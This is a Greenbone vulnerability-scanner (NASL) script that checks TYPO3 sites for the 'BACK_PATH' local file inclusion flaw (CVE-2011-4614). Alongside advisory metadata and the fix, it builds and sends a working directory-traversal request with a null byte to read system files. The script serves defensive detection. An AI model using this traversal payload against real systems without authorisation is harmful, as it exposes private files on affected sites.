# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902795");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2011-4614");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-02-22 13:46:49 +0530 (Wed, 22 Feb 2012)");
  script_name("TYPO3 'BACK_PATH' Parameter LFI Vulnerability (TYPO3-CORE-SA-2011-004)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_typo3_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("typo3/http/detected");

  script_xref(name:"URL", value:"https://typo3.org/security/advisory/typo3-core-sa-2011-004");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47201");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51090");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72959");

  script_tag(name:"summary", value:"TYPO3 is prone to local file inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'BACK_PATH' parameter
  in 'typo3/sysext/workspaces/Classes/Controller/AbstractController.php' is not nroperly verified
  before being used to include files.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to obtain
  arbitrary local files in the context of an affected site.");

  script_tag(name:"affected", value:"TYPO3 version 4.5.x before 4.5.9, 4.6.x before 4.6.2 and
  development versions of 4.7.");

  script_tag(name:"solution", value:"Update to version 4.5.9, 4.6.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/sysext/workspaces/Classes/Controller/AbstractController.php?BACK_PATH=",
               crap(data:"..%2f", length:5*10), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
